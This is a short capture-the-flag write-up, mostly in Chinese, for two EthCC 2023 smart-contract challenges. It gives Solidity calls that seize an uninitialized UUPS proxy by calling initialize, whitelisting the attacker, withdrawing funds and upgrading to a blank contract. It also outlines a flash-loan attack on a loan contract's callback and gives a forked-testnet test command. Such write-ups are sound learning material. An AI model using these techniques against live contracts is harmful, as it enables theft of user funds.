# Writeup

refer to [Repo](https://github.com/Snooowgh/warroom-ethcc-2023)

## 1. Proxy

题目要求其他人无法接管合约的implementation
Proxy合约未被初始化, 任何人可以获取owner权限
步骤如下:

- 调用initialize函数成为owner
- 调用whitelistUser函数加入到白名单中
- 调用withdraw函数提取 2 wei ETH
- 调用upgradeTo函数升级合约到自定义的空合约(UUPSUpgradeable合约函数)

```solidity
address(proxy).call{value: 0.1 ether}(
    abi.encodeWithSignature("initialize(address)", address(0))
);
address(proxy).call(
abi.encodeWithSignature("whitelistUser(address)", attacker)
);
address(proxy).call(
abi.encodeWithSignature("withdraw(uint256)", 2)
);
Blank blank = new Blank();
address(proxy).call(
abi.encodeWithSignature("upgradeTo(address)", address(blank))
);

```

## 2. Flash Loan

编写攻击合约, 实现IFlashLoanSimpleReceiver的方法,
通过调用AAVE池子的flashLoan函数获取大量DAI,
然后将资金转移到loan合约中,
再触发AAVE池子的flashLoan函数, 接收合约设置为loan合约,
触发loan合约的回调, 作为initiator获取到totalLoans额度,
接着调用removeLoan函数获取所有奖励, 把奖励转给攻击地址
最后归还借款

```
// 需要用到aave测试网络的部署合约
forge test --match-contract LoanTest -vvvv --fork-url https://eth-sepolia.g.alchemy.com/v2/XXX
```
